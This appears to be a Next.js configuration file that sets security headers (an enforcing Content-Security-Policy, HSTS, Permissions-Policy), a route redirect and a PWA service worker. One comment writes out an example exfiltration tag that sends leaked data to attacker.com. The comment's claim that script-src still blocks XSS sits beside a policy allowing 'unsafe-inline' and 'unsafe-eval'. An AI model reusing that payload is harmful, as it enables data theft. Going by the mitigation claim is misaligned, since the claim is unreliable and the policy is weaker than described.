import type { NextConfig } from "next";
import withSerwistInit from "@serwist/next";

// CSP — now ENFORCING. Shipped initially as -Report-Only to surface
// any missing-origin violations from a preview deploy without breaking
// the page; with the allowlist below stable, the header key is the
// enforcing form. If a new third-party origin gets added, expect a
// console block + a CSP violation report — extend connect-src/img-src
// as needed and re-deploy.
const CSP_DIRECTIVES = [
  "default-src 'self'",
  // 'unsafe-inline' + 'unsafe-eval' on script-src are required for Next's
  // inline boot script + dev HMR. A nonce-based replacement is the long-term
  // tightening, but it requires App Router upgrades coordinated separately.
  "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
  "style-src 'self' 'unsafe-inline'",
  "font-src 'self' data:",
  // 'https:' covers any HTTPS image source — YouTube thumbnails on the
  // library page, OAuth profile photos in UserMenu, and arbitrary
  // og:image hosts resolved by getOgImageUrl(). Enumerating each origin
  // would silently break a new library entry whenever its og:image
  // lives on an un-allowlisted CDN; the cost is that an XSS-injected
  // <img src="https://attacker.com/track?leak=…"> could exfiltrate via
  // the URL itself — mitigated because script-src still blocks the
  // underlying XSS attack.
  "img-src 'self' blob: data: https:",
  "media-src 'self' blob: *.supabase.co *.public.blob.vercel-storage.com",
  "connect-src 'self' *.supabase.co *.upstash.io api.anthropic.com api.deepgram.com api.hume.ai",
  "frame-ancestors 'none'",
  "base-uri 'self'",
  "form-action 'self'",
].join("; ");

const config: NextConfig = {
  reactStrictMode: true,
  // Skill Lab → Application Lab route rename (overhaul P1, DEC-4). The
  // surface moved from /skill-lab to /application-lab; keep the old paths
  // working (bookmarks, old share links, `/skill-lab/storytelling`,
  // `/skill-lab/clarity/exemplars`) with a permanent 308 redirect that
  // preserves the sub-path. Query strings (e.g. ?focus=) are carried
  // through automatically. DB `mode='skill_lab'` + code identifiers are
  // unchanged — this is a URL + copy rename only.
  async redirects() {
    return [
      {
        source: "/skill-lab",
        destination: "/application-lab",
        permanent: true,
      },
      {
        source: "/skill-lab/:path*",
        destination: "/application-lab/:path*",
        permanent: true,
      },
    ];
  },
  // typedRoutes: intentionally DISABLED. It's an experimental feature
  // that caused more type friction (Footer/GradientButton/Logo all hit
  // RouteImpl errors) than it shipped value. We use Next.js Link with
  // string hrefs and rely on TSC + unit tests to catch broken links.
  // Revisit when typedRoutes graduates from experimental.
  experimental: {},
  images: {
    formats: ["image/avif", "image/webp"],
  },
  async headers() {
    return [
      {
        source: "/:path*",
        headers: [
          { key: "X-Frame-Options", value: "DENY" },
          { key: "X-Content-Type-Options", value: "nosniff" },
          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
          // microphone allow-list. camera/geolocation/payment explicitly
          // denied so a future XSS can't trigger user prompts.
          {
            key: "Permissions-Policy",
            value:
              "microphone=(self), camera=(), geolocation=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=()",
          },
          // HSTS — 2 years, includeSubDomains, preload. Safe on Vercel
          // since the platform is HTTPS-only. The preload directive
          // requires manual submission to hstspreload.org once we're
          // confident; the header itself is no-op until then.
          {
            key: "Strict-Transport-Security",
            value: "max-age=63072000; includeSubDomains; preload",
          },
          // Enforcing CSP. If a deploy regression introduces a new
          // third-party origin, the browser console will block it and
          // log a CSP violation — fix the allowlist in CSP_DIRECTIVES
          // and ship a patch.
          {
            key: "Content-Security-Policy",
            value: CSP_DIRECTIVES,
          },
        ],
      },
      // Service-worker file must serve with no-cache so updates roll
      // out on the next page load instead of waiting out a CDN TTL.
      {
        source: "/sw.js",
        headers: [{ key: "Cache-Control", value: "no-cache, no-store, must-revalidate" }],
      },
    ];
  },
};

// Phase D — Serwist PWA service worker. Disabled in dev so HMR isn't
// fighting a cached bundle. Builds emit public/sw.js on production
// builds; ServiceWorkerRegister.tsx registers it client-side.
//
// cacheOnNavigation: turned OFF (audit PR-23). When true, the SW
// caches HTML navigations and could serve a signed-in shell to a
// just-signed-out user for one nav cycle. The PWA still works
// offline for static assets + already-loaded routes via the
// runtime cache; only the HTML shell now always re-fetches.
const withSerwist = withSerwistInit({
  swSrc: "src/app/sw.ts",
  swDest: "public/sw.js",
  cacheOnNavigation: false,
  reloadOnOnline: true,
  disable: process.env.NODE_ENV === "development",
});

export default withSerwist(config);
